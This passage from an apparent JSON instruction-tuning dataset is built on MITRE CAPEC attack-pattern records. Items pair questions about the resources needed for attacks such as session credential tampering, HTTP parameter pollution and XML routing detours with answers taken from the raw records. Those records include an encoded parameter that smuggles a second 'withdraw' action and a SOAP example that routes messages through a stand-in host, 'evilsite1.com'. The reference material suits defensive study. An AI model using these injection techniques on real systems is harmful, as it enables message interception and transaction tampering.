              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Alternate_Terms, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Likelihood_Of_Attack, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Resources_Required, Skills_Required, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Alternate_Terms, Extended_Description, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Session Credential Falsification through Manipulation (CAPEC ID: 226)",
    "context": "",
    "output": "required resources:\nAn attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.",
      "@Name": "Session Credential Falsification through Manipulation (CAPEC ID: 226)",
      "attack_ptrn": {
        "@ID": "226",
        "@Name": "Session Credential Falsification through Manipulation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.",
        "Extended_Description": {
          "xhtml:p": "For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "196"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted application must use session credentials to identify legitimate users."
        },
        "Resources_Required": {
          "Resource": "An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "565"
            },
            {
              "@CWE_ID": "472"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Protocol Manipulation (CAPEC ID: 272)",
    "context": "",
    "output": "The resources required to execute Protocol Manipulation (CAPEC ID: 272) are the following: In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications.",
      "@Name": "Protocol Manipulation (CAPEC ID: 272)",
      "attack_ptrn": {
        "@ID": "272",
        "@Name": "Protocol Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The protocol or implementations thereof must contain bugs that an adversary can exploit."
        },
        "Resources_Required": {
          "Resource": "In some variants of this attack the adversary must be able to intercept communications using the protocol. This means they need to be able to receive the communications from one participant and prevent the other participant from receiving these communications."
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Configuration/Environment Manipulation (CAPEC ID: 176)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Configuration/Environment Manipulation (CAPEC ID: 176):\nThe attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.",
      "@Name": "Configuration/Environment Manipulation (CAPEC ID: 176)",
      "attack_ptrn": {
        "@ID": "176",
        "@Name": "Configuration/Environment Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement."
        },
        "Resources_Required": {
          "Resource": "The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "15"
            },
            {
              "@CWE_ID": "1233"
            },
            {
              "@CWE_ID": "1234"
            },
            {
              "@CWE_ID": "1304"
            },
            {
              "@CWE_ID": "1328"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Setting Manipulation"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Configuration/Environment manipulation"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Screen Temporary Files for Sensitive Information (CAPEC ID: 155)",
    "context": "",
    "output": "required resources:\nBecause some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.",
      "@Name": "Screen Temporary Files for Sensitive Information (CAPEC ID: 155)",
      "attack_ptrn": {
        "@ID": "155",
        "@Name": "Screen Temporary Files for Sensitive Information",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an adversary might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the adversary could recover this from the web cache.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "150",
            "Exclude_Related": [
              {
                "@Exclude_ID": "514"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Look for temporary files in target application] An adversary will try to discover temporary files in a target application. Knowledge of where the temporary files are being stored is important information."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Attempt to read temporary files] An adversary will attempt to read any temporary files they may have discovered through normal means.",
              "Technique": [
                "Attempt to get the file by querying the file path to a web server",
                "Using a remote shell into an application, read temporary files and send out information remotely if necessary",
                "Recover temporary information from a user's browser cache"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Use function weaknesses to gain access to temporary files] If normal means to read temporary files did not work, an adversary will attempt to exploit weak temporary file functions to gain access to temporary files.",
              "Technique": [
                "Some C functions such as tmpnam(), tempnam(), and mktemp() will create a temporary file with a unique name, but do not stop an adversary from creating a file of the same name before it is opened by the application. Because these functions do not create file names that are sufficiently random, an adversary will try to make a file of the same name, causing a collision, and possibly altering file permissions for the temporary file so that it is able to be read.",
                "Similar to the last technique, an adversary might also create a file name collision using a linked file in a unix system such that the temporary file contents written out by the application write to a file of the adversaries choosing, allowing them to read the file contents."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target application must utilize temporary files and must fail to adequately secure them against other parties reading them."
        },
        "Resources_Required": {
          "Resource": "Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "377"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: HTTP Parameter Pollution (HPP) (CAPEC ID: 460)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern HTTP Parameter Pollution (HPP) (CAPEC ID: 460):\nAny tool that enables intercepting and tampering with HTTP requests",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Any tool that enables intercepting and tampering with HTTP requests",
      "@Name": "HTTP Parameter Pollution (HPP) (CAPEC ID: 460)",
      "attack_ptrn": {
        "@ID": "460",
        "@Name": "HTTP Parameter Pollution (HPP)",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary adds duplicate HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "15"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "676"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find User Input] The adversary finds anywhere in the web application that uses user-supplied input in a form or action. This can also be found by looking at parameters in the URL in the navigation bar of the browser"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Add Duplicate Parameter Values] Once the adversary has identified what user input is used as HTTP parameters, they will add duplicates to each parameter one by one to observe the results. If the response from the HTTP request shows the duplicate parameter value concatenated with the original parameter value in some way, or simply just the duplicate parameter value, then HPP is possible.",
              "Technique": [
                "In the URL, add a duplicate parameter by using the \"&\" delimiter. For example \"par1=val1\" becomes \"par1=val1&par1=val2\". Depending on the backend API, this could be treated as \"par1=val1, val2\", which could lead to par1 being set to val2, ignoring val1.",
                "If the request is created based on user input directly on the page, the adversary will test by adding an encoded delimiter to the input. For example, the adverary might supply \"1000%26action=withdraw\" and the backend might interpret a POST request with the paramters \"action=deposit&amount=1000&action=withdraw\""
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Leverage HPP] Once the adversary has identified how the backend handles duplicate parameters, they will leverage this by polluting the paramters in a way that benefits them. In some cases, hardcoded parameters will be disregarded by the backend. In others, the adversary can bypass a WAF that might only check a parameter before it has been concatenated by the backend, resulting in malicious queries getting through."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "HTTP protocol is used with some GET/POST parameters passed"
        },
        "Resources_Required": {
          "Resource": "Any tool that enables intercepting and tampering with HTTP requests"
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests",
            "Design: Perform URL encoding",
            "Implementation: Use strict regular expressions in URL rewriting",
            "Implementation: Beware of multiple occurrences of a parameter in a Query String"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "88"
            },
            {
              "@CWE_ID": "147"
            },
            {
              "@CWE_ID": "235"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Web Parameter Tampering"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-397"
            },
            {
              "@External_Reference_ID": "REF-606",
              "@Section": "Testing for HTTP Parameter Pollution"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Mitigations, References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: XML Routing Detour Attacks (CAPEC ID: 219), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe attacker must be able to insert or compromise a system into the processing path for the transaction.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to insert or compromise a system into the processing path for the transaction.",
      "@Name": "XML Routing Detour Attacks (CAPEC ID: 219)",
      "attack_ptrn": {
        "@ID": "219",
        "@Name": "XML Routing Detour Attacks",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "94"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.",
              "Technique": [
                "Use automated tool to record all instances to process XML requests or find exposed WSDL.",
                "Use tools to crawl WSDL"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.",
              "Technique": "Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).",
              "Technique": "The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted system must have multiple stages processing of XML content."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To inject a bogus node in the XML routing table"
          }
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to insert or compromise a system into the processing path for the transaction."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.",
            "Implementation: Use SSL for connections between all parties with mutual authentication."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction).",
              "Continuing with this example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that they have targeted.",
              "Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents)."
            ],
            "xhtml:b": [
              "Example SOAP message with routing information in header:",
              "Resulting in the following SOAP Header:",
              "Example of WS-Referral based WS-Routing injection of the bogus node route:",
              "Resulting XML Routing Detour attack:"
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": [
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "@style": "margin-left:1em;",
                          "xhtml:div": [
                            {
                              "@style": "margin-left:1em;",
                              "#text": "<m:action>http://example1.com/</m:action>"
                            },
                            {
                              "@style": "margin-left:1em;",
                              "#text": "<m:to>http://example4.com/router</m:to>"
                            },
                            {
                              "@style": "margin-left:1em;",
                              "#text": "<m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id>"
                            },
                            {
                              "@style": "margin-left:1em;",
                              "#text": "<m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd>"
                            },
                            {
                              "@style": "margin-left:1em;",
                              "#text": "<m:rev />"
                            }
                          ],
                          "#text": "<m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\">\n                           \n                           \n                           \n                           </m:path>"
                        },
                        "#text": "<S:Header></S:Header>"
                      },
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "@style": "margin-left:1em;",
                          "#text": "..."
                        },
                        "#text": "<S:Body></S:Body>"
                      }
                    ],
                    "#text": "<S:Envelope>\n                     </S:Envelope>"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "@style": "margin-left:1em;",
                          "#text": "<r:prefix>http://example2.com/router</r:prefix>"
                        },
                        "#text": "<r:for></r:for>"
                      },
                      {
                        "@style": "margin-left:1em;",
                        "#text": "<r:if/>"
                      },
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "@style": "margin-left:1em;",
                          "#text": "<r:via>http://example3.com/router</r:via>"
                        },
                        "#text": "<r:go></r:go>"
                      }
                    ],
                    "#text": "<r:ref xmlns:r=\"http://schemas.example.com/referral\">\n                     \n                     </r:ref>"
                  }
                ],
                "xhtml:br": null,
                "xhtml:p": "Add an additional node (example3.com/router) to the XML path in a WS-Referral message"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "result",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": [
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:action>http://example1.com/</m:action>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:to>http://example4.com/router</m:to>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "xhtml:div": [
                              {
                                "@style": "margin-left:1em;",
                                "#text": "<m:via>http://example2.com/router</m:via>"
                              },
                              {
                                "@style": "margin-left:1em;",
                                "#text": "<m:via>http://example3.com/router</m:via>"
                              }
                            ],
                            "#text": "<m:fwd>\n                              </m:fwd>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:rev />"
                          }
                        ],
                        "#text": "<m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\">\n                           \n                           \n                           \n                           </m:path>"
                      },
                      "#text": "<S:Header></S:Header>"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "#text": "..."
                      },
                      "#text": "<S:Body></S:Body>"
                    }
                  ],
                  "#text": "<S:Envelope>\n                     </S:Envelope>"
                }
              },
              {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "#text": "<r:prefix>http://example2.com/router</r:prefix>"
                      },
                      "#text": "<r:for></r:for>"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "#text": "<r:if/>"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "#text": "<r:via>http://evilsite1.com/router</r:via>"
                      },
                      "#text": "<r:go></r:go>"
                    }
                  ],
                  "#text": "<r:ref xmlns:r=\"http://schemas.example.com/referral\">\n                     \n                     </r:ref>"
                }
              },
              {
                "@style": "margin-left:1em;",
                "@class": "result",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": [
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:action>http://example_0.com/</m:action>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:to>http://example_4.com/router</m:to>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "xhtml:div": [
                              {
                                "@style": "margin-left:1em;",
                                "#text": "<m:via>http://example2.com/router</m:via>"
                              },
                              {
                                "@style": "margin-left:1em;",
                                "#text": "<m:via>http://evilesite1.com/router</m:via>"
                              },
                              {
                                "@style": "margin-left:1em;",
                                "#text": "<m:via>http://example3.com/router</m:via>"
                              }
                            ],
                            "#text": "<m:fwd>\n                              \n                              </m:fwd>"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "#text": "<m:rev />"
                          }
                        ],
                        "#text": "<m:path xmlns:m=\"http://schemas.example.com/rp/\" S:actor=\"http://schemas.example.com/soap/actor\" S:mustUnderstand=\"1\">\n                           \n                           \n                           \n                           </m:path>"
                      },
                      "#text": "<S:Header></S:Header>"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "#text": "..."
                      },
                      "#text": "<S:Body></S:Body>"
                    }
                  ],
                  "#text": "<S:Envelope>\n                     </S:Envelope>"
                }
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "441"
            },
            {
              "@CWE_ID": "610"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "32",
              "Entry_Name": "Routing Detour"
            },
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "44",
              "Entry_Name": "XML Entity Expansion"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-80",
              "@Section": "WASC-32 - Routing Detour"
            },
            {
              "@External_Reference_ID": "REF-81"
            },
            {
              "@External_Reference_ID": "REF-65"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Removing Important Client Functionality (CAPEC ID: 207)",
    "context": "",
